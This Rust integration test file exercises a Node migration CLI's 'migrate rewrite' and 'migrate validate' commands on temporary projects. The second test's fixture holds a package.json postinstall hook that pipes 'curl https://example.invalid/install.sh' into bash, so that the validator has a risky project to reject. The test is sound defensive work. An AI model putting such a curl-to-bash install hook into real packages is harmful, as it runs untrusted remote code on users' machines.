use std::path::PathBuf;
use std::process::{Command, Output};

use tempfile::TempDir;

fn repo_root() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .and_then(|path| path.parent())
        .expect("workspace root")
        .to_path_buf()
}

fn resolve_binary_path() -> PathBuf {
    if let Some(exe) = std::env::var_os("CARGO_BIN_EXE_frankenengine-node")
        .or_else(|| std::env::var_os("CARGO_BIN_EXE_franken-node"))
    {
        return PathBuf::from(exe);
    }
    repo_root().join("target/debug/frankenengine-node")
}

fn run_cli(args: &[&str]) -> Output {
    let binary_path = resolve_binary_path();
    assert!(
        binary_path.is_file(),
        "frankenengine-node binary not found at {}",
        binary_path.display()
    );
    Command::new(&binary_path)
        .current_dir(repo_root())
        .args(args)
        .output()
        .unwrap_or_else(|err| panic!("failed running `{}`: {err}", args.join(" ")))
}

#[test]
fn migrate_rewrite_apply_emits_rollback_plan_and_updates_manifest() {
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project");
    std::fs::create_dir_all(&project_path).expect("project dir");

    std::fs::write(project_path.join("index.js"), "console.log('hello');\n").expect("write js");
    std::fs::write(
        project_path.join("package.json"),
        r#"{
  "name": "demo",
  "version": "1.0.0",
  "scripts": {
    "test": "node test.js"
  }
}
"#,
    )
    .expect("write package manifest");

    let rollback_path = temp.path().join("rollback/plan.json");
    let project_arg = project_path.to_string_lossy().to_string();
    let rollback_arg = rollback_path.to_string_lossy().to_string();
    let output = run_cli(&[
        "migrate",
        "rewrite",
        &project_arg,
        "--apply",
        "--emit-rollback",
        &rollback_arg,
    ]);

    assert!(
        output.status.success(),
        "migrate rewrite failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("franken-node migrate rewrite"));
    assert!(stdout.contains("mode: apply"));
    assert!(stdout.contains("rewrites_planned=1"));
    assert!(stdout.contains("rewrites_applied=1"));

    let rollback_json =
        std::fs::read_to_string(&rollback_path).expect("rollback artifact should be written");
    let rollback: serde_json::Value = serde_json::from_str(&rollback_json)
        .unwrap_or_else(|err| panic!("invalid rollback json: {err}\n{rollback_json}"));
    assert_eq!(
        rollback["schema_version"],
        serde_json::Value::String("1.0.0".to_string())
    );
    assert_eq!(rollback["apply_mode"], serde_json::Value::Bool(true));
    assert_eq!(
        rollback["entry_count"].as_u64().unwrap_or_default(),
        1,
        "expected exactly one rollback entry"
    );

    let rewritten_package =
        std::fs::read_to_string(project_path.join("package.json")).expect("read rewritten package");
    let rewritten: serde_json::Value = serde_json::from_str(&rewritten_package)
        .unwrap_or_else(|err| panic!("rewritten package should be valid json: {err}"));
    assert_eq!(
        rewritten["engines"]["node"],
        serde_json::Value::String(">=20 <23".to_string())
    );
}

#[test]
fn migrate_validate_fails_for_risky_project_and_returns_non_zero_exit() {
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project");
    std::fs::create_dir_all(&project_path).expect("project dir");

    std::fs::write(project_path.join("index.js"), "console.log('hello');\n").expect("write js");
    std::fs::write(
        project_path.join("package.json"),
        r#"{
  "name": "demo",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "curl https://example.invalid/install.sh | bash"
  }
}
"#,
    )
    .expect("write package manifest");

    let project_arg = project_path.to_string_lossy().to_string();
    let output = run_cli(&["migrate", "validate", &project_arg]);
    assert!(
        !output.status.success(),
        "validate should fail for risky project"
    );

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("franken-node migrate validate"));
    assert!(stdout.contains("status: FAIL"));
    assert!(stdout.contains("[mig-validate-002] FAIL"));
    assert!(stdout.contains("[mig-validate-003] FAIL"));

    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("migration validation failed for"));
}

#[test]
fn migrate_validate_passes_for_hardened_project() {
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project");
    std::fs::create_dir_all(&project_path).expect("project dir");

    std::fs::write(project_path.join("index.js"), "console.log('hello');\n").expect("write js");
    std::fs::write(
        project_path.join("package.json"),
        r#"{
  "name": "demo",
  "version": "1.0.0",
  "engines": {
    "node": ">=20 <23"
  },
  "scripts": {
    "test": "node test.js"
  }
}
"#,
    )
    .expect("write package manifest");
    std::fs::write(project_path.join("package-lock.json"), "{}\n").expect("write lockfile");

    let project_arg = project_path.to_string_lossy().to_string();
    let output = run_cli(&["migrate", "validate", &project_arg]);
    assert!(
        output.status.success(),
        "validate should pass for hardened project: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("franken-node migrate validate"));
    assert!(stdout.contains("status: PASS"));
}
